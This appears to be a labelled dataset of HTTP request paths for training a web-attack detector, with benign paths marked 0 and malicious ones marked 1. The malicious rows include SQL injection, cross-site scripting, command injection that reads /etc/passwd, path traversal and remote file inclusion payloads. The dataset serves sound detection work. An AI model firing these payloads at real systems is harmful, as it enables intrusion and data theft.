request	label
"/ manager / workarea / contentdesigner / ekformsiframe . aspx ? id =  ""  >  < script > alert (  ' nessus '  )  <  / script > "	1
/ games_chess / 	0
/ sesja6 / 	0
/ javascript / openejb . swf 	0
/ 117352admin / 	0
/ javascript / enc . trace 	0
/ start9 / 	0
/ dir_phnntp / article-raw . php ? file_newsportal = xxpathxx ? 	1
/ administrator / components / com_chronocontact / excelwriter / pps / file . php ? mosconfig_absolute_path = xxpathxx ? 	1
/ viewfeed / 	0
"/ qczkquis . html ?  < script > document . cookie =  "" testkwlg = 5591 ;  ""  <  / script > "	1
"/ d7ktpmcq . pl ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ string / strings / parameters = hilda 	0
/ 041356 / 	0
/ string / strings / parameters = 5034737965253978 	0
"/ en-us / 9kr0ih0v . cgi ?  < meta http-equiv = set-cookie content =  "" testzgnm = 1183 ""  > "	1
/ string / strings / parameters = 544 	0
"/ string / strings / parameters = ""  echo vsicuh $  (  ( 78 + 75 )  )  $  ( echo vsicuh ) vsicuh | "	1
/ string / strings / parameters = cueva de montesinos 80 11-g 	0
/  $ windowsregkeyupdate-24 / 	0
/ string / strings / parameters = quint 	0
/ javascript / recycle . jar 	0
/ serif webplus v10 / 	0
/ string / strings / parameters = 67718883y 	0
/ hous95 / 	0
/ string / modo = entrar & login = chao & pwd = 62si27t8ico & remember = off & b1 = entrar 	0
/ searchpromotionlogo / 	0
/ settings . php ? p [ includes ]  = xxpathxx 	1
/ main . php ? stuff = ping ; -w ; 8000 ; -n ; 1 ; 4 . 3 . 2 . 1 & rem ; 	1
/ 2661iconheadervers2 / 	0
/ lascanitas2 / 	0
/ monarch / 	0
/ string / strings / parameters = 9528603304738849 	0
/ string / strings / parameters = 1 where 2649 = 2649 or  ( select  *  from  ( select ( sleep ( 5 )  )  ) ydpu )  -- 	1
/ string / strings / parameters = alyce 	0
/ 6170070 / 	0
/ ices2000 / 	0
/ string / strings / parameters = calle pianista berdion ,  s / n ,  13 ? g 	0
/ string / strings / parameters = turtuno @ touringa . hu 	0
/ bemarket / postscript / postscript . php ? p_mode = http :  /  / 192 . 168 . 202 . 118 : 8080 / 2aibfaczmac8 ? 	1
/ string / strings / parameters = cangalaya 	0
"/ top . php ? stuff =  ""  & ping , -w , 7000 , -n , 1 , 4 . 3 . 2 . 1 & rem , "	1
/ other_logos / 	0
"/ string / strings / parameters = -3790 ""  ""  )  as ojgb where 5925 = 5925 union all select 5925 , 5925 # "	1
/ b5xdqgz2 . nsf ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / strings / parameters = -7636 '  )  or 5898 = 8880 and  (  ' sjuv '  =  ' sjuv 	1
/ string / strings / parameters = 1 '  )  )  or elt ( 5873 = 5873 , sleep ( 5 )  )  # 	1
/ string / strings / parameters = '  )  ;  } print (  ` echo gvzzmk ; echo  $  (  ( 1 + 62 )  )  ; echo gvzzmk ; echo gvzzmk `  )  ;  /  / gvzzmk 	1
/ 126979 / 	0
/ examples / jsp / checkbox / index . php ? user_langue =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ string / strings / parameters = 1 '  ; select sleep ( 5 )  and  ' yzix '  =  ' yzix 	1
/ civilian_casualties / 	0
/ facing_challenges / 	0
"/ string / strings / parameters = 1 ""  ""  where 9241 = 9241 union all select null # "	1
/ netpbm / 	0
/ tc20060608_602015 / 	0
/ string / strings / parameters = exactor 	0
/ cgi-bin / common . php ? f = 0 & forumlang =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ string / strings / parameters = 62585578w 	0
/ javascript / program . exe 	1
/ string / strings / parameters = -8429 '  )  )  )  or make_set ( 9354 = 9354 , 7185 )  and  (  (  (  ' bwih '  like  ' bwih 	1
/ protecdadosricardobarretto / 	0
/ string / strings / parameters = javascript : alert ( 1 )  /  / 	1
/ string / strings / parameters = hoyocasero 	0
/ compaesth05 / 	0
/ string / strings / parameters = |  | echo $ ifsrejvul $  (  ( 89 + 39 )  )  $  ( echo $ ifsrejvul ) rejvul & 	1
/ n1afe1y6 . exe ?  < script > cross_site_scripting . nasl <  / script > 	1
/ cocporn / 	0
/ string / strings / parameters = jamal 	0
/ tonycubed / 	0
"/ string / strings / parameters = 1 ""  ""  where 8734 = 8734 ; select  *  from generate_series ( 7762 , 7762 , case when  ( 7762 = 1293 )  then 1 else 0 end )  limit 1 -- "	1
"/ help . php ? q =  "" rm q77224434 & rem "	1
/ include . php ? path = psp / user . php & site = xxpathxx 	1
/ string / id = 2 & nombre = queso + manchego & precio = 39 & cantidad = 4 & b1 = aadir + al + carrito 	0
/ examples / jsp / cal / popup . php ? include_path =  / etc / passwd \ x00 	1
/ 88-10658 / 	0
/ string / strings / parameters = '  |   [  3 -ne  $  ( echo jeorxy  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  | 	1
/ newsp / lib / class . database . php ? path = xxpathxx ? 	1
/ string / strings / parameters = 50780 	0
/ string / modo = registro & login = misslitz & password = tribunato & nombre = valerio & apellidos = stoupignan + pias & email = lampert9 @ vinavilano . lu & dni = 13641255r & direccion = calle + santa + rita ,  + 83 ,  +  & ciudad = alpandeire & cp = 32514 & provincia = a + corua & ntc = 499657041751357 & b1 = registrar 	1
/ string / strings / parameters = kylo 	0
/ h5sc3gxy . exe ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / id = 1 & nombre = jamn + ibrico & precio = 100 & cantidad = 95 & b1 = aadir + al + carrito 	0
/ examples / jsp / jsp2 / el / plugins / safehtml / htmlsax3 . php ? dir [ plugins ]  =  / etc / passwd \ x00 	1
/ string / strings / parameters = 22416 	0
"/ string / modo = registro & login = melonie & password = ad1168n77 & nombre = dulio & apellidos = ubach + rodrguez & email = wilmot @ schnaps . com . ne & dni = 87584326g & direccion = c /  + lara ,  + 162 +  & ciudad = villanueva + de + campen & cp =  ""  + and +  "" 1 ""  =  "" 1 & provincia = barcelona & ntc = 5124736256894307 & b1 = registrar "	1
"/ string / strings / parameters = 1 %  ""  ""  and  ( 2850 = 6610 )  * 6610 and  ""  ""  %  ""  ""  =  ""  "" "	1
/ string / strings / parameters = altavista @ hojainformativa . com . tz 	0
/ javascript / format . exe 	1
/ string / strings / parameters = $  { exec ( print (  ` echo aojpqw \ necho  $  (  ( 18 + 92 )  )  \ necho aojpqw \ necho aojpqw `  )  ;  )  } aojpqw 	1
/ string / strings / parameters = regueras de arriba 	0
/ string / strings / parameters = 72nt89ct7v1 	0
/ string / strings / parameters = -2748 '  )  )  as gazw where 4624 = 4624 union all select 4624 , 4624 # 	1
/ vbpag-report / 	0
/ drowning by numbers soundtrack / 	0
/ string / id = 2 & nombre = jamn + ibrico & precio = 39 /  & cantidad = 78 & b1 = aadir + al + carrito 	1
/ parrot_kidnap / 	0
/ spicyclip_13 / 	0
/ scripts / am . pl ? path = bin / mozilla & action = display_form & file = users / etc / passwd & login = root + login 	1
/ recipematcher / 	0
/ p043snfr . cfm ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / modo = insertar & precio = 3574 & b1 = pasar + por + caja / 	1
/ philippines / 	0
/ 158191 / 	0
/ string / strings / parameters = burgos ,  s / n ,  1f 	0
/ javascript / count . conf 	0
/ commerce_icon / 	0
/ string / strings / parameters = 34844 	0
/ nelsonminar / 	0
/ javascript / postnuke . jar 	0
/ mzm5mzy1 / 	0
/ test_30 / 	0
"/ string / strings / parameters = ""  |   [  8 -ne  $  ( echo jrazza  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  & "	1
/ aa570402 / 	0
"/ o35zot2r . htm ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ string / strings / parameters = 7s0av07rido 	0
/ -15604 / 	0
/ official university calendar / 	0
"/ fpnpp5zg . kspx ?  < meta http-equiv = set-cookie content =  "" testyias = 101 ""  > "	1
/ h5sc3gxy . do ?  < script > cross_site_scripting . nasl <  / script > 	1
"/ hjdzm96v . pl ?  < meta http-equiv = set-cookie content =  "" testbyqe = 7474 ""  > "	1
/ sgtleej / 	0
/ javascript / czcmdcvt . cnf 	0
/ pobierz-4849 / 	0
/ string / strings / parameters = marchena 	0
/ 000044659 / 	0
/ string / strings / parameters = ; echo dcosdu $  (  ( 41 + 86 )  )  $  ( echo dcosdu ) dcosdu & 	1
/ string / strings / parameters = 8005 	0
/ javascript / cover . inc 	0
/ film-scanners / 	0
/ examples / jsp / jsp2 / el / googlesearch / googlesearch . php ? app [ path ]  [ lib ]  =  / etc / passwd \ x00 	1
/ string / modo = registro & login = johan & password = recelosa & nombre = guillermina & apellidos = giulivo + padilla & email = cardona @ interanuncios . mv & dni = 93860343b & direccion = altos + de + lillo ,  + 137 +  & ciudad = lumbrales & cp = 27002 & provincia = cuenca & ntc = 5936907680257741 & b1 = registrar 	0
/ javascript / terms . error 	0
/ javascript / ejb . ws 	0
/ 158929 / 	0
/ string / strings / parameters = brasset 	0
/ string / strings / parameters = |  | echo mmjatu $  (  ( 39 + 34 )  )  $  ( echo mmjatu ) mmjatu \ 	1
/ 518316 / 	0
"/ miz4r5hz . x ?  < meta http-equiv = set-cookie content =  "" testviqu = 1270 ""  > "	1
/ index . php ? id =  ' union /  *  *  / select /  *  *  / 0 , 0 , 2115200900 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 -- 	1
/ string / strings / parameters = 1 '  )  and 3560 = 5467 -- 	1
/ javascript / information . zip 	0
/ string / modo = insertar & precio =  ?  & b1 = pasar + por + caja 	1
/ string / strings / parameters = 1 %  '  )  )  ; create or replace function sleep ( int )  returns int as  '  / lib / libc . so . 6 '  ,  ' sleep '  language  ' c '  strict ;  select sleep ( 5 )  -- 	1
/ top . php ? stuff =  & rm , q26167811 & rem , 	0
"/ top . php ? stuff =  ""  & rm \ x09q38641956 \ x09 # "	1
/ javascript / access . cfg 	0
/ 0768668689 / 	0
"/ main . php ? logout =  "" rm ; q97754931 & rem ; "	1
"/ forum-ra . asp ? n =  /  .  \  ""  .  /  .  \  ""  .  /  .  \  ""  .  /  .  \  ""  .  /  .  \  ""  .  / boot . ini "	1
/ script_path / config . inc . php ? _path = http :  /  / 192 . 168 . 202 . 96 : 8080 / 4dckqcc0acprbz ?  ? 	1
/ gasplus / 	0
"/ string / strings / parameters = 1 ""  ""  )  as ivuv where 5691 = 5691 ; select like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  )  -- "	1
/ string / strings / parameters = calle leganes 155 13 ? e 	0
"/ string / strings / parameters = < script a =  ""  >  ""   '  '  src =  "" http :  /  / ha . ckers . org / xss . js ""  >  <  / script > "	1
/ multinic / 	0
"/ string / strings / parameters = |  | echo detqcq $  (  ( 28 + 83 )  )  $  ( echo detqcq ) detqcq "" "	1
"/ string / strings / parameters = -9023 %  ""  ""  )  )  )  union all select 4490 , 4490 , 4490 # "	1
/ string / strings / parameters = < xonxxx = 1 	1
/ string / strings / parameters = 3729462689240161 	0
/ 5270322 / 	0
/ string / modo = registro & login = maala8 & password = cascabela & nombre = ludolfo & apellidos = peuela + sains & email = snerd @ bwds . tj & dni = 15365381r & direccion = c /  + 57 + 15 ,  + 9g & ciudad = regueras + de + arriba & cp = 08281 & provincia = ourense & ntc = 2815170427897112 & b1 = registrar 	0
/ string / strings / parameters = 1 %  '  )  )  ; call regexp_substring ( repeat ( right ( char ( 3702 )  , 0 )  , 500000000 )  , null )  and  (  (  '  %  '  =  ' 	1
/ rss_home / 	0
/ string / strings / parameters = 1 )  )  as spdf where 8554 = 8554 or 2633 = dbms_pipe . receive_message ( chr ( 112 )  |  | chr ( 65 )  |  | chr ( 65 )  |  | chr ( 103 )  , 5 )  -- 	1
/ string / strings / parameters = 49181 	0
/ n_1017453 / 	0
/ lodging_gifts / 	0
/ string / strings / parameters = & echo nlpfsa $  (  ( 24 + 13 )  )  $  ( echo nlpfsa ) nlpfsa /  / 	1
/ 152251 / 	0
/ meneame / 	0
/ string / modo = entrar & login = stouder '  + and +  ' 1 '  =  ' 1 & pwd = ti064ga & remember = on & b1 = entrar 	1
/ javascript / usr . ep 	0
"/ string / str =  $  ( echo gnkpol )   str1 =  $  {  # str }   if  [  5 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  "" "	1
/ article-160154 / 	0
/ javascript / tar . bz2 . gz 	0
/ string / strings / parameters = 3053383097473695 	0
/ irs_tax / 	0
/ string / strings / parameters = berenice 	0
/ string / modo = registro & login = tyner & password = palmario & nombre = urko & apellidos = abelli + blasi & email = gemelli @ hiperxxx . asia & dni = 12269719r & direccion = c /  + cangas + del + narcea ,  + 97 ,  + 12 ? e & ciudad = villanueva + de + carazo & cp = 29716 & provincia = soria & ntc = 7870029061793911 & b1 = registrar 	0
/ javascript / local . doc 	0
/ javascript / ms-sql . swf 	0
/ ows-bin / fileseek2 . cgi ? foot =  ; cat  / etc / passwd & head = 	1
/ string / strings / parameters = latella 	0
/ 150501 / 	0
/ serial-crack / 	0
/ string / strings / parameters = admin '   # 	1
/ string / strings / parameters = & apos ;  ;  alert ( 1 )  ;  /  / 	1
"/  ?  < script > document . cookie =  "" testxllt = 9940 ;  ""  <  / script > "	1
/ string / strings / parameters = 1 )  as pyjx where 9005 = 9005 ; select benchmark ( 5000000 , md5 ( 0x714e4153 )  )  # 	1
"/ string / strings / parameters = -3082 ""  ""  )  where 1082 = 1082 or 5023 = ctxsys . drithsx . sn ( 5023 ,  ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 5023 = 5023 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  )  -- "	1
"/ string / strings / parameters = 1 %  ""  ""  ; select pg_sleep ( 5 )  -- "	1
/ string / strings / parameters = james 	0
/ scripts / view_item ? html_file =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
"/ string / strings / parameters = < base href = data :  /  , alert ( 1 )  /  >  < script src =  "" jquery . js ""  >  <  / script > "	1
/ staffandfaculty / 	0
"/ top . php ? stuff =  "" del , q55729425 & rem , "	1
"/ string / strings / parameters = < script > var m =  < html >  < a href =  ""  /  / host ""  > link <  / a > "	1
/ examples / jsp / sessions / adlayer . php ? layerstyle =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
"/ string / strings / parameters = -6809 ""  ""  )  )  or 5903 =  (  ' qqpjq '  |  |  ( select case 5903 when 5903 then 1 else 0 end from rdb $ database )  |  |  ' qzvzq '  )  and  (  (  ""  "" nfnf ""  ""  =  ""  "" nfnf "	1
/ gps-plus_software / 	0
/ string / modo = registro & login = linas & password = cerd24a & nombre = eranio & apellidos = cus + motj & email = twist . dangerfield @ beltoan . com . ne & dni = 90907663w & direccion = once + s / n +  & ciudad = olas + del + rey & cp = 37219 & provincia = lleida & ntc = 6481855129498664 & b1 = registrar 	0
/ rbec2ohx . htm ?  < script > cross_site_scripting . nasl <  / script > 	1
"/ string / strings / parameters = 1 ""  ""  )  )  as tpeh where 6306 = 6306 and 5965 = 5806 # "	1
/ examples / jsp / num / index . php ? op = default & date = 200607 '  union select 1 , 652029819 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 --  & blogid = 1 	1
/ string / strings / parameters = 7919 	0
/ vjbrrppi . php3 ?  < script > cross_site_scripting . nasl <  / script > 	1
/ mzywodq3 / 	0
/ string / strings / parameters = '  ;  str =  $  ( echo ooyllh )  ;  str1 =  $  {  # str }  ;  if  [  2 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  ' 	1
/ ies4linux / 	0
/ tk496-browserhelper_dll / 	0
/ examples / jsp / jsp2 / jspx / index . php ? id = urjhxcl19w ' 	1
/ cacti / includes / db_adodb . php ? basedir =  / etc / passwd \ x00 	1
/ string / strings / parameters = rhys 	0
/ javascript / import . rhtml 	0
/ 2904886 / 	0
/ msg04553 / 	0
/ javascript / computer . swf 	0
/ string / strings / parameters = ( 1 ) rlike ( if ( mid (  @  @ version , 1 , 1 ) like ( 5 )  , 0x28 , 1 )  ) 	1
/ string / strings / parameters = 1 '  |  |  ( select  ' tdcr '  where 6792 = 6792 union all select null , null , null , null , null # 	1
/ greypn / 	0
/ uhren-lexikon / 	0
/ string / strings / parameters = |  | echo $ ifsmwpsux $  (  ( 83 + 82 )  )  $  ( echo $ ifsmwpsux ) mwpsux ' 	1
/ string / strings / parameters = 5ua5teo 	0
/ string / strings / parameters = -8274 '  )  )  union all select 3048 -- 	1
/ nanopeg editor v2 / 	0
/ string / strings / parameters = -4384 '  )  )  )  or 6872 = 6872 and  (  (  (  ' ukhl '  =  ' ukhl 	1
"/ string / strings / parameters = & lt ; head & gt ;  & lt ; meta http-equiv =  \  "" content-type \  ""  content =  \  "" text / html ;  charset = utf-7 \  ""  & gt ;   & lt ;  / head & gt ;  + adw-script + ad4-alert (  ' xss '  )  ;  + adw- / script + ad4- "	1
/ gpsxml / 	0
/ 189420 / 	0
/ string / strings / parameters = gomero gallardo 	0
/ string / strings / parameters = 4907598174142069 	0
/ phpreactor / inc / users . inc . php ? pathtohomedir = xxpathxx ? 	1
/ preview . php ? php_script_path = xxpathxx ?  & cmd = dir 	1
/ 29bizchoice / 	0
/ string / strings / parameters = -8301 '  )  )  )  or  ( 5708 = 5268 )  * 5268 and  (  (  (  ' hkha '  =  ' hkha 	1
/ string / strings / parameters = azarosa 	0
/ string / strings / parameters = 1013839255415195 	0
/ orders . txt 	0
/ javascript / console . jhtml 	0
/ egaet53a . kspx ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / strings / parameters = calle alonso nuez 186 ,  12 ? b 	0
/ string / strings / parameters = 9ara 	0
/ thegambols / 	0
/ string / strings / parameters = 1 and 3707 =  ( select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 ) 	1
/ string / modo = insertar & precio = 1295 & b1 = pasar + por + caja 	0
/ simsswitchblade / 	0
/ cntr-ter / 	0
/ main . php ? logout =  \ x0duname \ x09 > q96841788 \ x09 # 	1
/ ar2007010401573 / 	0
/ javascript / agenda . rss 	0
/ sf4800 / 	0
/ nsaebb81 / 	0
/ 189245 / 	0
/ javascript / procedures . cs 	0
/ nessusclient . swf 	0
/ willie nelson / 	0
/ 060510-205107 / 	0
/ string / strings / parameters = echo gqtwxi $  (  ( 72 + 93 )  )  $  ( echo gqtwxi ) gqtwxi \ 	1
/ string / strings / parameters = 7402575875977830 	0
/ string / strings / parameters = 34081266g 	0
"/ m2fpztty . exe ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ examples / jsp / jsp2 / el / autohtml . php ? op = modload & mailfile = x & name =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ dsc02440 / 	0
/ examples / jsp / cal / view_user . php ? list = 1 & letter =  & sort_by =  ' select 	1
/ string / strings / parameters = 1 '  )  )  )  and char ( 111 )  |  | char ( 77 )  |  | char ( 121 )  |  | char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 )  |  | char ( 69 )  |  | char ( 83 )  , null )  , 0 )  , 500000000 )  , null )  and  (  (  (  ' kpsg '  like  ' kpsg 	1
"/ help . php ? q =  ""  & rm \ x09q27972468 & rem \ x09 "	1
"/ tuwjta1w . htm ?  < script > document . cookie =  "" testpokn = 7494 ;  ""  <  / script > "	1
/ javascript / dummy . db 	0
/ machinist / 	0
/ powerkills / 	0
"/ string / strings / parameters = 1 ""  ""  )  )  as oiqr where 4073 = 4073 or 8156 =  ( select count (  *  )  from generate_series ( 1 , 5000000 )  )  -- "	1
/ empire hotel hong kong / 	0
/ dl5824 / 	0
"/ string / strings / parameters = -2916 ""  ""  )  )  or 4946 = 8232 -- "	1
/ string / strings / parameters = otowa @ ebuy . com . ci 	0
"/ default . asp ? view = archives & month =  "" generate_error & year = 2004 "	1
/ string / modo = registro & login = thirugna & password = desplacib-le & nombre = maciel & apellidos = ginest + baquedano & email = dekeyser @ creacionwebs . bn & dni = 46344401e & direccion = camino + san + jaime + 97 ,  +  & ciudad = montemayor + de + pililla & cp = 46814 & provincia = lleida & ntc = 6905166660575167 & b1 = registrar 	0
/ f020703f / 	0
/ 27apr20050800 / 	0
/ sl-1725 / 	0
/ string / id = 2 /  & nombre = queso + manchego & precio = 39 & cantidad = 84 & b1 = aadir + al + carrito 	1
/ templates / barry / template . tpl . php ? renderer = xxpathxx 	1
"/ string / strings / parameters = -4866 ""  ""  )  as eyrq where 8365 = 8365 or 1898 = 8320 # "	1
/ westminster_03 / 	0
"/ string / strings / parameters = & lt ; img lowsrc =  \  "" javascript &  # 058 ; alert (  ' xss '  )  \  ""  & gt ; "	1
/ string / strings / parameters = 1 '  |  |  ( select  ' pygt '  from dual where 5543 = 5543 union all select null , null , null , null , null , null # 	1
/ string / strings / parameters = rigau amer 	0
/ javascript / spool . stackdump 	0
"/ phpmyadminsearch-results . dot ? search_query = nessus ""  >  < script > alert (  ' dotcms_search_query_xss . nasl '  )  <  / script >  / "	1
/ string / strings / parameters = novikoff @ schnapps . com . cl 	0
/ string / strings / parameters = -9541 )  as bnky where 3934 = 3934 union all select 3934 , 3934 , 3934 # 	1
/ string / strings / parameters = &  & echo yaifin $  (  ( 82 + 83 )  )  $  ( echo yaifin ) yaifin \  \ 	1
/ e1000c7a28ee8ff481b7762b0838ab17 / 	0
/ string / modo = insertar & precio = 9168 & b1 = confirmar / 	1
/ string / id = 3 & nombre = vino + rioja & precio = 85 & cantidad =  +  & b1 = aadir + al + carrito 	1
/ cgi-bin / index . php ? selskin =  .  .  / inc / boxleft . inc \ x00 & xposbox [ l ]  [  ]  =  / etc / passwd \ x00 	1
/ string / strings / parameters = mallari 	0
/ view / main / twikiusers ? rev = 2  | less  / etc / passwd 	1
"/ string / strings / parameters = 1 ""  ""  )  as dfmm where 7563 = 7563 or 8421 =  ( select count (  *  )  from generate_series ( 1 , 5000000 )  )  -- "	1
/ shop_widget / 	0
/ dcs2kfadgbu4fifiaykf17dq1_7m2d / 	0
/ javascript / suite . manifest 	0
"/ scs86g1p . fts ?  < script > document . cookie =  "" testquyx = 2820 ;  ""  <  / script > "	1
/ string / strings / parameters = 5170844676174994 	0
/ dl6073 / 	0
